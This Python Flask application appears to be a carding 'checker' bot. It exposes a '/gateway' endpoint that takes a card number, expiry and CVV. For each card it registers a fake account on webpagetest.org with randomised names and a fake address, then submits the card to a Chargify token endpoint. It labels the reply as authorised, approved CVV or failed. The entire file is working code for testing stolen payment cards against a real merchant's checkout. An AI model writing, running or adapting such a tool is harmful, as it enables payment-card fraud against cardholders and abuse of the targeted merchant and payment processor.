from flask import Flask, request, jsonify
import requests
import random
import time
import re

app = Flask(__name__)

def shuffle_str(s):
    chars = list(s)
    random.shuffle(chars)
    return ''.join(chars)

@app.route('/gateway', methods=['GET'])
def gateway():
    gateway = request.args.get('gateway')
    cc_param = request.args.get('cc')
    
    if gateway != 'br' or not cc_param:
        return jsonify({
            'Gateway Info': 'BRAINTREE CHARGE',
            'Other Gates': '/cmds (not implemented in API)',
            'Usage': 'Call /gateway?gateway=br&cc=cc|mm|yy|cvv'
        })
    
    lista = cc_param
    parts = lista.split('|')
    if len(parts) != 4:
        return jsonify({'error': 'Invalid format, use cc|mm|yy|cvv'})
    
    cc, mon, year, cvv = [p.strip() for p in parts]
    if not all([cc, mon, year, cvv]):
        return jsonify({'error': 'PLEASE CHECK THE INPUT FIELDS AND TRY AGAIN'})
    
    # Process month (remove leading 0 if <10, assuming 2-digit input like 09 -> 9)
    if len(mon) == 2 and mon.startswith('0'):
        mon = mon[1:]
    try:
        int_mon = int(mon)
        if not (1 <= int_mon <= 12):
            raise ValueError
        mon = str(int_mon)
    except:
        return jsonify({'error': 'Invalid month'})
    
    # Process year
    if len(year) == 2:
        year = '20' + year
    elif len(year) != 4:
        return jsonify({'error': 'Invalid year'})
    
    ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1'
    
    # Session for requests (no proxies, cookies handled by session)
    s = requests.Session()
    s.headers.update({'User-Agent': ua})
    
    try:
        # Req 1: GET signup to get auth_token
        start = time.time()
        r1 = s.get('https://www.webpagetest.org/signup', headers={'Referer': 'https://www.webpagetest.org/'}, timeout=15)
        r1.raise_for_status()
        time1 = time.time() - start
        
        at_match = re.search(r'auth_token"\s+value="([^"]+)"', r1.text)
        if not at_match:
            raise ValueError('Auth token not found')
        at = at_match.group(1)
        
        # Generate random values (ported from PHP shuffle and ucfirst)
        first = shuffle_str('Cristhian').capitalize()
        last = shuffle_str('Madison').capitalize()
        com = shuffle_str('waidfbfuu efreegwrb').capitalize()
        first1 = shuffle_str("txfnx18092566")
        
        # Req 2: POST to select plan
        start = time.time()
        data2 = {
            'csrf_token': '',
            'auth_token': at,
            'step': '1',
            'plan': 'MP5',
            'billing-cycle': 'monthly'
        }
        headers2 = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.webpagetest.org',
            'Referer': 'https://www.webpagetest.org/signup',
            'User-Agent': ua
        }
        r2 = s.post('https://www.webpagetest.org/signup', data=data2, headers=headers2, timeout=15, allow_redirects=False)
        r2.raise_for_status()
        time2 = time.time() - start
        
        # Req 3: POST user details
        start = time.time()
        data3 = {
            'first-name': first,
            'last-name': last,
            'company-name': com,
            'email': f'{first1}@gmail.com',
            'password': 'Joker@2019',
            'confirm-password': 'Joker@2019',
            'street-address': 'gardenia drive 6767',
            'city': 'San Jose',
            'state': 'CA',
            'country': 'US',
            'zipcode': '92055',
            'csrf_token': '',
            'auth_token': at,
            'plan': 'MP5',
            'step': '2'
        }
        headers3 = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.webpagetest.org',
            'Referer': 'https://www.webpagetest.org/signup/2',
            'User-Agent': ua
        }
        r3 = s.post('https://www.webpagetest.org/signup', data=data3, headers=headers3, timeout=15, allow_redirects=False)
        r3.raise_for_status()
        time3 = time.time() - start
        
        # Req 4: POST to Chargify for token (Braintree gate)
        start = time.time()
        json_data = {
            "key": "chjs_6nx8y5rbw875f78dn5yx7n9g",
            "revision": "2022-12-05",
            "credit_card": {
                "first_name": "jay",
                "last_name": "mehta",
                "full_number": cc,
                "expiration_month": mon,
                "expiration_year": year,
                "cvv": cvv,
                "device_data": "",
                "billing_address": "gardenia drive 6767",
                "billing_city": "San Jose",
                "billing_state": "CA",
                "billing_country": "US",
                "billing_zip": "92055"
            },
            "origin": "https://www.webpagetest.org"
        }
        headers4 = {
            'Content-Type': 'application/json',
            'Origin': 'https://js.chargify.com',
            'Referer': 'https://js.chargify.com/',
            'User-Agent': ua
        }
        r4 = s.post('https://catchpoint.chargify.com/js/tokens.json', json=json_data, headers=headers4, timeout=15)
        r4.raise_for_status()
        time4 = time.time() - start
        
        total_time = time1 + time2 + time3 + time4
        curl4 = r4.text.lower()  # Lowercase for case-insensitive checks
        
        # Parse response (prefer JSON, fallback to string extraction if needed)
        try:
            resp_json = r4.json()
            errors = resp_json.get('errors')
            if isinstance(errors, list):
                rsp = ' '.join(errors) if errors else ''
            elif isinstance(errors, dict):
                rsp = ' '.join(str(v) for v in errors.values() if v)
            elif isinstance(errors, str):
                rsp = errors
            else:
                rsp = ''
            success = resp_json.get('success', False)
        except:
            success = 'success":true' in curl4
            # Fallback string extraction (no external regex file needed)
            def get_str(h, start, end):
                try:
                    return h.split(start)[1].split(end)[0].strip().strip('"')
                except:
                    return ''
            rsp = get_str(r4.text, 'errors":', '}')
        
        # Status checks (ported logic, case-insensitive)
        if "insufficient" in curl4 or "1000" in curl4:
            status = "✅ Card Authorized"
            response_msg = rsp
        elif "declined cvv" in curl4 or "2024" in curl4:
            status = "✅ Authorized CCN"
            response_msg = rsp
        elif success:
            status = "✅ Card Charged and Authorized"
            response_msg = "success"
        elif "3ds2" in curl4:
            status = "✅ Approved CVV"
            response_msg = "3DS"
        elif rsp or 'errors' in r4.text.lower():
            status = "❌ Failed To Authorize Card"
            response_msg = rsp or 'Errors present'
        else:
            status = "❌ Unknown Failure"
            response_msg = r4.text[:200]  # Truncated raw response
        
        # Card type and other fields (static placeholders since BIN lookup removed)
        card_type = "Unknown"
        bank1 = "Unknown"
        country = "Unknown"
        
        # Result JSON (structured, no Telegram sendMessage)
        result = {
            "Gateway": "BRAINTREE CHARGE",
            "Card": lista,
            "Status": status,
            "Response": response_msg,
            "Bank": bank1,
            "Type": card_type,
            "Country": country,
            "Time seconds": f"{total_time:.4f} seconds",
            "Proxy": "None (proxies removed for self-contained app)",
            "Bot by": "Fares (ported to Flask API)"
        }
        return jsonify(result)
    
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)  # For Render, it uses env PORT; adjust if needed
